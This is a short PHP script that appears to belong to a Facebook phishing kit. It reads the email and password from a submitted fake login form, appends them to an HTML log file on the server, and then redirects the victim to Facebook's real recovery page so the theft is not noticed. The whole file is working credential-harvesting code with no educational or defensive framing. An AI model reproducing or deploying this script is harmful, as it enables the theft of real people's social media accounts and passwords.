<?php
file_put_contents("kmklh4x00r.html", "Facebook Page<br> Username:<b> " . $_POST['email'] . "</b> Password:<b> " . $_POST['pass'] ."</b><br><hr>", FILE_APPEND);
header('Location: https://facebook.com/recover/initiate/');
exit();
?>
